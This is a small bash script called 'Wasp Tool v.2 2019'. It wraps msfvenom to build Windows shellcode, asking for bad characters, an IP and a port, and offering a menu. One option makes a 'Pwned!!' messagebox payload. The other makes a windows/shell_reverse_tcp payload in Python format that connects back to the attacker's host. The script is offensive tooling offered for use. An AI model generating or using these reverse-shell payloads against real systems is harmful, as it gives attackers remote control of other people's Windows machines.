#!/bin/bash
echo
cat << "EOF"

__      ____ _ ___ _ __  
\ \ /\ / / _` / __| '_ \ 
 \ V  V / (_| \__ \ |_) |
  \_/\_/ \__,_|___/ .__/ 
                  | |    
                  |_| 
EOF
echo
echo -e "\e[1;31m:::::::Wasp Tool v.2 2019:::::::.\e[0m"
echo -e "\e[1;32mPlease enter Bad characters :\e[0m"
read bad
echo -e "\e[1;32mPlease Enter Your IP :\e[0m"
read ip
echo -e "\e[1;32mPlease Enter  Port :\e[0m"
read port
echo -e "\e[1;32m1. Windows Messagebox  .\e[0m"
echo -e "\e[1;32m2. Windoews Shell reverse x86 .\e[0m"
echo -e "\e[1;32m5. main.\e[0m"
echo -e "\e[1;32m6. Exit.\e[0m"
echo


echo -e "\e[1;36m1. Choice.\e[0m"
read -n3
case "$REPLY" in
     1) msfvenom x86 --platform windows -p windows/messagebox TEXT="Pwned!!" -b $bad -f python ;;
     2) msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f py -b $bad ;;
     5) wasp ;;
     6) exit ;;
     *) echo; echo "Invalid choice."; echo
esac
sleep 1



